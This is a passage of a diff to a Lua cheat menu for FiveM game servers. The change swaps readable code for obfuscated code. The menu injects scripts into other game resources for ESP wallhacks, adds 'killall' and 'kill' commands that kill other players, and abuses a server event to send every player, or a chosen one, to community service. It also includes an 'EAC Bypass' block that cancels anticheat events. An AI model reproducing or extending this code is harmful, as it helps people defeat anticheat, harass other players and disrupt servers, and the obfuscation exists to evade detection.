                 end
             end
         end)
-    ]])
-    MachoMenuNotification("Weapon", "Weapon RGB ON")
-end, function()
-    weaponRGBActive = false
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Weapon","Weapon RGB ON");end,function() local v474=0;while true do if (v474==(469 -(304 + 165))) then v188=false;MachoInjectResource2(NewThreadNs,"monitor",[[
         weaponRGBActive = false
-    ]])
-    MachoMenuNotification("Weapon", "Weapon RGB OFF")
-end)
-
-print("[Weapons] Tab loaded!")
-
-local OthersTab = MachoMenuAddTab(MenuWindow, "ESP Menu")
-local OthersSection = MachoMenuGroup(OthersTab, "ESP Menu", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
-MachoMenuCheckbox(OthersSection, "ESP", function()
-    MachoInjectResource("any", [[
+    ]]);v474=1 + 0 ;end if (v474==(161 -(54 + 106))) then MachoMenuNotification("Weapon","Weapon RGB OFF");break;end end end);print("[Weapons] Tab loaded!");local v189=MachoMenuAddTab(v4,"ESP Menu");local v190=MachoMenuGroup(v189,"ESP Menu",v3,1978 -(1618 + 351) ,(v1.x-v3) + 106 + 44 ,v1.y);MachoMenuCheckbox(v190,"ESP",function() MachoInjectResource("any",[[
         local espActive = true
         CreateThread(function()
             while espActive do
@@ -9339,15 +4012,9 @@ MachoMenuCheckbox(OthersSection, "ESP", function()
             DrawText(0.0, 0.0)
             ClearDrawOrigin()
         end
-    ]])
-end, function()
-    MachoInjectResource("any", [[
+    ]]);end,function() MachoInjectResource("any",[[
         espActive = false
-    ]])
-end)
-
-MachoMenuCheckbox(OthersSection, "ESP Box", function()
-    MachoInjectResource("any", [[
+    ]]);end);MachoMenuCheckbox(v190,"ESP Box",function() MachoInjectResource("any",[[
         espBoxActive = true
         CreateThread(function()
             while espBoxActive do
@@ -9404,15 +4071,9 @@ MachoMenuCheckbox(OthersSection, "ESP Box", function()
                 Wait(0)
             end
         end)
-    ]])
-end, function()
-    MachoInjectResource("any", [[
+    ]]);end,function() MachoInjectResource("any",[[
         espBoxActive = false
-    ]])
-end)
-
-MachoMenuCheckbox(OthersSection, "Detail ESP Info", function()
-    MachoInjectResource("any", [[
+    ]]);end);MachoMenuCheckbox(v190,"Detail ESP Info",function() MachoInjectResource("any",[[
         espInfoActive = true
         CreateThread(function()
             while espInfoActive do
@@ -9449,15 +4110,9 @@ MachoMenuCheckbox(OthersSection, "Detail ESP Info", function()
                 Wait(0)
             end
         end)
-    ]])
-end, function()
-    MachoInjectResource("any", [[
+    ]]);end,function() MachoInjectResource("any",[[
         espInfoActive = false
-    ]])
-end)
-
-MachoMenuCheckbox(OthersSection, "ESP Lines", function()
-    MachoInjectResource("any", [[
+    ]]);end);MachoMenuCheckbox(v190,"ESP Lines",function() MachoInjectResource("any",[[
         espLinesEnabled = true
         CreateThread(function()
             while espLinesEnabled do
@@ -9477,45 +4132,9 @@ MachoMenuCheckbox(OthersSection, "ESP Lines", function()
                 Wait(0)
             end
         end)
-    ]])
-end, function()
-    MachoInjectResource("any", [[
+    ]]);end,function() MachoInjectResource("any",[[
         espLinesEnabled = false
-    ]])
-end)
-
-local crosshairc2 = false
-
-MachoMenuCheckbox(OthersSection, "DOT Crosshair", function()
-    crosshair = false
-    crosshairc = false
-    crosshairc2 = true
-    CreateThread(function()
-        while crosshairc2 do
-            Citizen.Wait(0)
-            DrawTxt("~r~.", 0.4968, 0.478)
-        end
-    end)
-end, function()
-    crosshairc2 = false
-end)
-
--- DrawTxt function example (add if missing)
-function DrawTxt(text, x, y)
-    SetTextFont(4)
-    SetTextProportional(1)
-    SetTextScale(0.0, 0.5)
-    SetTextColour(255, 0, 0, 255) -- Red color
-    SetTextDropshadow(0, 0, 0, 0, 255)
-    SetTextEdge(1, 0, 0, 0, 255)
-    SetTextDropShadow()
-    SetTextOutline()
-    SetTextEntry("STRING")
-    AddTextComponentString(text)
-    DrawText(x, y)
-end
-
-MachoInjectResource("any", [[
+    ]]);end);local v191=false;MachoMenuCheckbox(v190,"DOT Crosshair",function() local v475=1016 -(10 + 1006) ;while true do if (v475==0) then crosshair=false;crosshairc=false;v475=1;end if (v475==1) then v191=true;CreateThread(function() while v191 do local v862=0 + 0 ;while true do if (0==v862) then Citizen.Wait(0 + 0 );DrawTxt("~r~.",0.4968 -0 ,1033.478 -(912 + 121) );break;end end end end);break;end end end,function() v191=false;end);function DrawTxt(v476,v477,v478) SetTextFont(2 + 2 );SetTextProportional(1);SetTextScale(1289 -(1140 + 149) ,0.5);SetTextColour(164 + 91 ,0,0 -0 ,48 + 207 );SetTextDropshadow(0 -0 ,0 -0 ,0 + 0 ,0,884 -629 );SetTextEdge(1,186 -(165 + 21) ,0,0,366 -(61 + 50) );SetTextDropShadow();SetTextOutline();SetTextEntry("STRING");AddTextComponentString(v476);DrawText(v477,v478);end MachoInjectResource("any",[[
 -- Kill all
 RegisterCommand("killall", function()
     local playerPed = PlayerPedId()
@@ -9570,10 +4189,7 @@ RegisterCommand("killall", function()
         SetEntityCoords(playerPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
     end)
 end)
-]])
-
--- EAC Bypass
-MachoInjectResource('monitor', [[
+]]);MachoInjectResource("monitor",[[
     RegisterNetEvent('Anticheat:CheckJumping')
     AddEventHandler('Anticheat:CheckJumping', function()
        CancelEvent()
@@ -9613,57 +4229,7 @@ MachoInjectResource('monitor', [[
     AddEventHandler('Anticheat:pong', function()
        CancelEvent()
     end)
-]])
-
--- COMMUNITY SERVICE FOR EVERYONE --> /herkesekamu
-RegisterCommand("herkesekamu", function(source, args, rawCommand)
-    local playerPed = PlayerPedId()
-    local playerCoords = GetEntityCoords(playerPed)
-    local affectedPlayers = 0
-
-    for _, playerId in ipairs(GetActivePlayers()) do
-        local targetPed = GetPlayerPed(playerId)
-
-        if targetPed ~= playerPed then
-            local targetCoords = GetEntityCoords(targetPed)
-            local distance = #(playerCoords - targetCoords)
-
-            local targetServerId = GetPlayerServerId(playerId)
-            TriggerServerEvent('qb-communityservice:sendToCommunityService', targetServerId, 0)
-            affectedPlayers = affectedPlayers + 1
-            Citizen.Wait(3050)
-        end
-    end
-
-    if affectedPlayers > 0 then
-        TriggerEvent("chat:addMessage", {
-            color = {0, 255, 0},
-            multiline = true,
-            args = {"System", affectedPlayers .. " FIX"}
-        })
-    else
-        TriggerEvent("chat:addMessage", {
-            color = {255, 0, 0},
-            multiline = true,
-            args = {"System", "no ren!"}
-        })
-    end
-end, false)
-
-RegisterCommand("kamu", function(source, args, rawCommand)
-    local enemyId = tonumber(args[1])
-
-    local targetServerId = GetPlayerServerId(enemyId)
-    TriggerServerEvent('qb-communityservice:sendToCommunityService', enemyId, 22)
-
-    TriggerEvent("chat:addMessage", {
-        color = {0, 255, 0},
-        multiline = true,
-        args = {"System", enemyId .. " id's player is Kamu mode"}
-    })
-end, false)
-
-MachoInjectResource("any", [[
+]]);RegisterCommand("herkesekamu",function(v479,v480,v481) local v482=PlayerPedId();local v483=GetEntityCoords(v482);local v484=0;for v518,v519 in ipairs(GetActivePlayers()) do local v520=0;local v521;while true do if ((0 + 0)==v520) then v521=GetPlayerPed(v519);if (v521~=v482) then local v919=0 -0 ;local v920;local v921;local v922;while true do if (v919==(3 -1)) then v484=v484 + 1 + 0 ;Citizen.Wait(4510 -(1295 + 165) );break;end if (v919==(1 + 0)) then v922=GetPlayerServerId(v519);TriggerServerEvent("qb-communityservice:sendToCommunityService",v922,0 + 0 );v919=2;end if (v919==(1397 -(819 + 578))) then v920=GetEntityCoords(v521);v921= #(v483-v920);v919=1;end end end break;end end end if (v484>(1402 -(331 + 1071))) then TriggerEvent("chat:addMessage",{color={0,2192 -(1834 + 103) ,0},multiline=true,args={"System",v484   .. " FIX" }});else TriggerEvent("chat:addMessage",{color={746 -(128 + 363) ,0,0 + 0 },multiline=true,args={"System","no ren!"}});end end,false);RegisterCommand("kamu",function(v485,v486,v487) local v488=0 -0 ;local v489;local v490;while true do if (v488==(0 + 0)) then v489=tonumber(v486[1010 -(615 + 394) ]);v490=GetPlayerServerId(v489);v488=1;end if (1==v488) then TriggerServerEvent("qb-communityservice:sendToCommunityService",v489,22);TriggerEvent("chat:addMessage",{color={0 + 0 ,1156 -901 ,651 -(59 + 592) },multiline=true,args={"System",v489   .. " id's player is Kamu mode" }});break;end end end,false);MachoInjectResource("any",[[
 RegisterCommand("kill", function(source, args)
     local targetId = tonumber(args[1])
     if not targetId then return end
@@ -9714,4 +4280,4 @@ RegisterCommand("kill", function(source, args)
         end)
     end
 end)
-]])
+]]);
